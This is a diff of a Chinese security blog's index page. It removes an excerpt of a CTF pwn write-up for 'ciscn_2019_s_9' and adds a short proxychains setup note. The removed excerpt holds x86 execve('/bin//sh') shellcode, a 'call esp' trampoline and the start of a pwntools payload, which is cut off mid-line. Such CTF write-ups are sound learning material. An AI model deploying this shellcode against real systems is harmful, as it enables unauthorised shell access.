@@ -134,63 +134,6 @@
     
     
     <div class="col-12 col-md-8 m-auto">
-      <a href="/2020/01/24/ciscn_2019_s_9/">
-        <p class="h4 index-header">ciscn_2019_s_9</p>
-        
-        
-          
-        
-        <div class="index-excerpt" >
-          <div class="index-text mb-1">ciscn_2019_s_9
-啥保护没开，第一时间考虑shellcode
-
-
-另外leak只有50，leak多才考虑直接走rop
-
-尝试过ret2libc,但是怎么都调不出来= =
-shellcode =&#39;&#39;&#39;
-xor    eax,eax
-push   eax
-push   0x68732f2f #//sh
-push   0x6e69622f # /bin
-mov    ebx,esp
-mov    ecx,eax
-mov    edx,eax
-mov    al,0xb
-int    0x80
-xor    eax,eax
-inc    eax
-int    0x80
-&#39;&#39;&#39;
-shellcode =asm(shellcode) #使用shellcraft.sh打不通，估计是因为太长了
-shell=&quot;sub esp,0x28;call esp&quot;
-shell =asm(shell)
-sh.recvuntil(&quot;&gt;\n&quot;)
-payload = shellcode.ljust(0x24,&quot</div>
-        </div>
-      </a>
-
-      <div>
-        
-          <i class="iconfont icon-riqi2"></i>&nbsp;2020-01-24&nbsp;&nbsp;
-        
-        
-          <i class="iconfont icon-inbox"></i>
-          
-            <a href="/categories/CTF">CTF</a>&nbsp;
-          
-            <a href="/categories/buu">buu</a>&nbsp;
-          &nbsp;
-        
-        
-      </div>
-    </div>
-  </div>
-
-  <div class="row mb-4 mx-auto">
-    
-    
-    <div class="col-12 col-md-8 m-auto">
       <a href="/2020/01/23/%E5%BC%BA%E7%BD%91%E6%9D%AF2019_%E6%8B%9F%E6%80%81-STKOF/">
         <p class="h4 index-header">强网杯2019_拟态-STKOF</p>
         
@@ -602,6 +545,52 @@ die 查看32/64 和壳等
             <a href="/categories/PWN%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA">PWN环境搭建</a>&nbsp;
           &nbsp;
         
+        
+      </div>
+    </div>
+  </div>
+
+  <div class="row mb-4 mx-auto">
+    
+    
+    <div class="col-12 col-md-8 m-auto">
+      <a href="/2020/01/10/Proxychains/">
+        <p class="h4 index-header">Proxychains</p>
+        
+        
+          
+        
+        <div class="index-excerpt" >
+          <div class="index-text mb-1">折腾两小时，不如问一下人= =
+Proxychains
+先安装
+然后sudo vi /etc/proxychains.conf
+socks5 win_ip 1080
+win_ip为你的windows主机ip，可在cmd ifconfig查看
+飞机要打开允许局域网连接
+
+然后运行测试
+proxychains4 telnet www.google.com 443
+可以之后就可以直接sudo proxychains4 apt-get update了
+</div>
+        </div>
+      </a>
+
+      <div>
+        
+          <i class="iconfont icon-riqi2"></i>&nbsp;2020-01-10&nbsp;&nbsp;
+        
+        
+          <i class="iconfont icon-inbox"></i>
+          
+            <a href="/categories/Linux%E4%BD%BF%E7%94%A8">Linux使用</a>&nbsp;
+          &nbsp;
+        
+        
+          <i class="iconfont icon-tag"></i>
+          
+            <a href="/tags/Linux%20%E9%97%AE%E9%A2%98%E8%A7%A3%E5%86%B3">Linux 问题解决</a>&nbsp;
+          
         
       </div>
     </div>
